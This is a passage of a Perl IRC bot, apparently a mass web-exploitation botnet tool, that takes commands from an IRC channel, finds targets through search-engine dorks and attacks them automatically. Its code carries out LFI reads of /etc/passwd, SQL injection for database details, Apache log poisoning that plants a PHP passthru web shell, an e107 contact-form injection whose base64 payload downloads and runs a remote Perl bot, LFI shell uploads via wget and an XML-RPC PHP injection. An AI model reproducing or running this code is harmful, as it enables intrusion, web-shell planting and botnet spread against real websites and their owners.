		if ($msg=~ /PRIVMSG $channel :$lficmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&lfiscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$lficmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $dork = $1;
					&lfiscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$lficmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&lfiscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$lficmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&lfiscan($engx,$d0rk);
				}
				exit;
			}
		}

		######### [ LFI Check Vuln ] ########################
		if ($msg=~ /PRIVMSG $channel :$lficek (.*)$/ ) {
		if (my $pid = fork) { waitpid($pid, 0);}
		else { if (fork) {	exit; } else {
		@vuls = ('../../../../../../../../../../../etc/passwd',
				 '../../../../../../../../../../../etc/passwd%00');
		my $test = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 Searching7 ".$test." ... 8!");
		foreach $scan(@vuls){
		$url = $test.$scan;
		$request = HTTP::Request->new(GET=>$url);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /root:x:/) {
			$msg = "7YES!!";
							}
					else { $msg = "4NO!!";}
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 $url [ $msg 0] 8!");
			}
		  }
		exit;
		}}

		######### [ LFI Check Vuln2 ] ########################
		if ($msg=~ /PRIVMSG $channel :$lficek (.*)$/ ) {
		if (my $pid = fork) { waitpid($pid, 0);}
		else { if (fork) {	exit; } else {
		@vuls = ('../../../../../../../../../../../proc/self/environ',
				 '../../../../../../../../../../../proc/self/environ%00');
		my $test = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 Searching7 ".$test." ... 8!");
		foreach $scan(@vuls){
		$url = $test.$scan;
		$request = HTTP::Request->new(GET=>$url);
		$useragent = LWP::UserAgent->new();
		$response = $useragent->request($request);
		if ($response->is_success && $response->content =~ /DOCUMENT_ROOT=/) {
			$msg = "7YES!!";
							}
					else { $msg = "4NO!!";}
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 $url [ $msg 0] 8!");
			}
		  }
		exit;
		}}

		####################################################
		####               [ SQLi  Respond ]             ####
		#####################################################

		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$sqlcmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 Dork :7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 Search Engine Loading ... 8!");
					&sqlscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$sqlcmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&sqlscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$sqlcmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $d0rk = $1;
					&sqlscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$sqlcmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&sqlscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$sqlcmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&sqlscan($engx,$d0rk);
				}
				exit;
			}
		}

		############## [ Define SQLi Tools Fuzzed ] #########
		if ($msg=~ /PRIVMSG $channel :$scol (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 Column Counting Started , Please Wait .... 8!");
				my $site = $1 ;
				my $null = "09+and+1=" ;
				my $code = "0+union+select+" ;
				my $add = "+" ;
				my $com = "--" ;
				my $injection = $site.$null.$code."0",$com ;
				my $request   = HTTP::Request->new(GET=>$injection);
					my $useragent = LWP::UserAgent->new();
					my $response  = $useragent->request($request);
					my $result   = $response->content;
						 if( $result =~ /You have an error in your SQL syntax/ || $result=~/Query failed/ || $result=~/SQL query failed/ || $result=~ /mysql_fetch_/ || $result=~ /mysql_fetch_array/ || $result =~ /mysql_num_rows/ || $result =~ /The used SELECT statements have a different number of columns/)
							 {
								sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 This Website Is Vulnerable 8!");
								sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 Working On It 8!");
							 }
						 else
							 {
							   sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 This WebSite Is 7Not0 SQL Vulnerable ! 8!");
							 }
								   for ($i = 0 ; $i < 50 ; $i ++)
										 {
										 $col.=','.$i;
										 $specialword.=','."0x7777772e696e646f7365637572652e6e6574";
											  if ($i == 0)
												  {
													 $specialword = '' ;
													 $col = '' ;
												  }
										   $sql=$site.$null.$code."0x7777772e696e646f7365637572652e6e6574".$specialword.$com ;
							 my $ua = LWP::UserAgent->new();
							 my $res = $ua->get($sql);
										   $response=$res->content;
											if($response =~ /www.indosecure.net/)
												  {
													 $i ++;
													 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 This Injection Have6 $i 0Columns 8!") ;
												}
										 }

		                    	}
			        	exit;
		         }
		}

		if ($msg=~ /PRIVMSG $channel :$sdetail (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
				 my $site      = $1 ;
				 my $selection = "concat(0x7777772e696e646f7365637572652e6e6574,version(),0x7777772e696e646f7365637572652e6e6574,database(),0x7777772e696e646f7365637572652e6e6574,user(),0x7777772e696e646f7365637572652e6e6574,\@\@datadir,0x7777772e696e646f7365637572652e6e6574)";
				 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 Target: $site 8!");
				 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 Info Getting, Started Please Wait .... 8!");
				 if ($site =~ /(.*)indosecure(.*)/i)
						 {
							 $newlink = $1.$selection.$2.'--';
							 my $ua = LWP::UserAgent->new();
						     my $request = $ua->get($newlink);
						     my $content = $request->content;
								 if ($content =~ /www.indosecure.net(.*)www.indosecure.net(.*)www.indosecure.net(.*)www.indosecure.net(.*)www.indosecure.net/)
									 {
							 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [+] Database Version  :6 $1 8!");
							 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [+] Database Name     :6 $2 8!");
							 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [+] DB UserName       :6 $3 8!");
							 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [+] Database Dir      :6 $4 8!");
						 }
						   else
						   {
							 sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [!] Failed 8!");
						 }
				   }
				 else
					 {
					   sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14FUZZ4]0 [!] Please Enter the target this way :6 http://target.net/page.php?id=0+union+select+1,2,indosecure,3 8!");
				   }
			    }
			exit;
		    }
		}
		#####################################################
		####               [ RCE  Respond ]              ####
		#####################################################

		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$rcecmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 Dork :4 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 Search Engine Loading ... 8!");
					&rcescan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$rcecmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&rcescan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$rcecmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $d0rk = $1;
					&rcescan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$rcecmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&rcescan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$rcecmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&rcescan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################################
		####                  [ Apache Log Injection ]                   ####
		#####################################################################
		if ($msg=~ /PRIVMSG $channel :$alicmd\s+(.*?)\s+(.+[0-9])/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					&injectlog($1,$2);
				}
				exit;
			}
		}

		for(my $c=0; $c<= $#lines; $c++) {
			$line = $lines[$c];
			$line=$line_temp.$line if ($line_temp);
			$line_temp='';
			$line =~ s/\r$//;
			unless ($c == $#lines) {
				parse("$line");
			} else {
				if ($#lines == 0) {
					parse("$line");
				} elsif ($lines[$c] =~ /\r$/) {
					parse("$line");
				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
					parse("$line");
				} else {
					$line_temp = $line;
				}
			}
		}
	}
}


#### [ Function Define ]  ####
sub injectlog() {
	my $host = $_[0];
	my $port = $_[1];
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)12 Injecting7 ".$host.":".$port." 12Apache Access Log ...");
	my $php = "<?php if(get_magic_quotes_gpc()){ \$_GET[ijoo]=stripslashes(\$_GET[ijoo]);} passthru(\$_GET[ijoo]);?>";
	$sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => 80, Proto => "tcp") ||
	die sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)4 Cant Connect to7 ".$host.":".$port."");
	print $sock "GET /IS.ijoo ".$php." HTTP/1.1\r\n";
	print $sock "Host: ".$host."\r\n";
	print $sock "Connection: close\r\n\r\n";
	close($sock);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)7 ".$host." 12is Done ...");
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)7 ".$host." 12RCE Parameter  ->3 ijoo");
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2ALI15)7 ".$host." 12RCE Identifier ->3 IS.ijoo");
}

sub zenscan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 $engz Scan Finish for7 $dork 8!");
		}
		system("php /tmp/4ss.php $target");
		my $sikat = "http://".$target."/images/ijoo.php";
		my $re   = getcontent($sikat);
		if ($re  =~ /$zen_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 (9YES0)14 ".$sikat." 8!");
		}
	}
}

sub phpascan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $adminx = "http://".$target."/phpMyAdmin/";
		system("sh /tmp/admin $admix");sleep(6);
		my $sikat = "http://".$adminx."/config/config.inc.php?c=id";
		my $re   = getcontent($sikat);
		if ($re  =~ /$rce_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 (9YES0)14 ".$sikat." 8!");
		}
	}
}
sub lokoscan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $xpl  = "http://".$target.$loko_test;
		my $vuln = "http://".$target."12".$loko_test."";
		my $re   = getcontent($xpl);
		if ($re  =~ /$loko_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 (9YES0)14 ".$vuln." 8!");
		}
	}
}

sub lfiscan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $xpl  = "http://".$target.$dork.$lfi_test;
		my $vuln = "http://".$target."12".$dork."7".$lfi_test."";
		my $re   = getcontent($xpl);
		if ($re  =~ /$lfi_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 (9YES0)14 ".$vuln." 8!");
		}
	}
}

sub e107scan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 $engz Scan Finish for7 $dork 8!");
		}
		my $cmd = "echo(base64_decode(\"aUpvbw==\").php_uname().base64_decode(\"a2VyZW4=\"));shell_exec(base64_decode(\"d2dldCBodHRwOi8vd2FrYWJhLmMzLmN4L2NoYW4udHh0IC1PIC90bXAvY2hhbjE7Y3VybCAtbyAvdG1wL2NoYW4yIGh0dHA6Ly93YWthYmEuYzMuY3gvY2hhbi50eHQ7bHdwLWRvd25sb2FkIGh0dHA6Ly93YWthYmEuYzMuY3gvY2hhbi50eHQgL3RtcDtmZXRjaCBodHRwOi8vd2FrYWJhLmMzLmN4L2NoYW4udHh0IC1vIC90bXAvY2hhbjM7cGVybCAvdG1wL2NoYW4udHh0O3BlcmwgL3RtcC9jaGFuMTtwZXJsIC90bXAvY2hhbjI7cGVybCAvdG1wL2NoYW4z\"));";
		my $ua = LWP::UserAgent->new or die;
		$ua->agent('Mozilla/4.76 [ru] (X11; U; SunOS 5.7 sun4u)');
		$ua->timeout(15);
		my $xple = "http://".$target."contact.php";
		my $xpl = "http://".$target."/contact.php";
		$xpl =~ s/\/\/contact.php/\/contact.php/g;
		my $req = HTTP::Request->new(POST => $xpl);
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
		my $res = $ua->request($req);
		my $cont = $res->content;
			if ($cont =~ /iJoo(.*)keren/) {
				my $uname = $1;
				$uname=~s/\n//;
				$uname=~s/\r//;
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 $xple 12=>7 $uname 8!");
			}
	}
}

sub cmde107() {
	my $path = $_[0];
	my $incmd = $_[1];
	my $codecmd = encode_base64($incmd);
	my $cmd = 'echo(base64_decode("aUpvbw==").shell_exec(base64_decode("aWQ=")).base64_decode("aW5kb3NlY3VyZQ==")).shell_exec(base64_decode("'.$codecmd.'"))';
		$access = new LWP::UserAgent;
		$access->agent("Mozilla/5.0");
		my $req = new HTTP::Request POST => $path;
		   $req->content_type('application/x-www-form-urlencoded');
		   $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
		my $res = $access->request($req);
		my $data = $res->as_string;
		if ( $data =~ /indosecure(.*)/ ){
			 $mydata = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e107cmd4]0 $mydata 8!");
		}
}
sub lfiscan2() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 $engz Scan Finish for7 $dork 8!");
		}
		my $lfiz  = "../../../../../../../../../../../../../../..";
		my $xpl  = "http://".$target.$bugz.$lfi2_test;
		my $vuln = "http://".$target."12".$bugz."7".$ilfi2_test."";
		my $re   = getcontent($xpl);
		if ($re  =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                my $sikatx = exploitx($xpl,"uname -a;echo ijoo;id");
                $sikatx =~ s/\n//g;
                if ($sikatx =~ /ijoo#(.*)ijoouid=(.*)#ijoo/sg) {
                    my ($sys,$uid) = ($1,$2);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 (9YES0)14 http://".$target."12".$bugz."0 ->6 uid=".$uid." 8!");
			my $tmp = "/tmp/ijoo".int rand(2010);
			my $upload = exploitx($xpl,"wget $ijoo_shell -O $tmp"); sleep(2);
			my $res = getcontent("http://".$target.$bugz.$lfiz.$tmp.'%00');
			    if ($res =~ /shell gendheng/) {
				    sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 (9SHELL0) 14 http://".$target."".$bugz."".$lfiz."".$tmp."%00 6( @".$sys." ) 8!");
					 }
                   }
                else {
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 (9YES0)14 ".$vuln." 8!");
                    }
                } exit;
		     }
		  sleep(3);
	   }
	}
}

sub sqlscan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
	my @webde=&webde($dork);
	push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni = scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $xpl  = "http://".$target.$sql_test;
		my $vuln = "http://".$target."12".$bugz."7[SQL]";
		my $re   = getcontent($xpl);
		if ($re  =~ /$sql_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14SQL4]0 (9YES0)14 ".$vuln." 8!");
		}
	}
}

sub xmlscan() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
		my @webde=&webde($dork);
		push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $xpl  = "http://".$target.$bugz;
		my $vuln = "http://".$target."12".$bugz;
		my $re   = getcontent($xpl);
		if ($re  =~ /faultCode/ && $re =~ /faultString/ && $re =~ /XML error: no element found at line 1/ ) {
			my $userAgent = LWP::UserAgent->new(agent => 'perl post');
			$exploit = "<?xml version=\"1.0\"?><methodCall>";
			$exploit .= "<methodName>test.method</methodName>";
			$exploit .= "<params><param><value><name>',''));";
			$exploit .= "echo 'ijoo';echo 'uname -a';echo 'ijoo';exit;/*</name></value></param></params></methodCall>";
			my $response = $userAgent->request(POST $xpl,
			Content_Type => 'text/xml',
			Content => $exploit);
			if ($response->content =~ /ijoo(.*)ijoo/s) {
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 (9YES0)14 http://".$target."12".$bugz." 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 (9YES0)14 XMLSHELL:7 $1 8!");
                   }
             }
       }
}


sub rcescan() {
	my $engz = $_[0];
	my $dork = $_[1];
	my $contatore = 0;
	if ($engz =~ /GooGLe/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /AllTheWeb/) {
		my @alltheweb=&alltheweb($dork);
		push(@total, @alltheweb);
	}
	if ($engz =~ /ALtaViSTa/) {
		my @altavista=&altavista($dork);
		push(@total, @altavista);
	}
	if ($engz =~ /WebDe/) {
	my @webde=&webde($dork);
	push(@total, @webde);
	}
	if ($engz =~ /BlowSearch/) {
	my @blows=&blows($dork);
	push(@total, @blows);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 $engz 12Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).") 8!");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 $engz Exploiting7 $dork 8!");
	}
	my $uni = scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 $engz Scan Finish for7 $dork 8!");
		}
		my $xpl  = "http://".$target.$rce_test;
		my $vuln = "http://".$target."12".$rce_test;
		my $re   = getcontent($xpl);
		if ($re  =~ /gid=/ && $re =~ /uid=/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14RCE4]0 (9YES0)14 ".$vuln." 8!");
		}
	}
}

sub os() {
	my $site = $_[0];
	my $re   = &query($site);
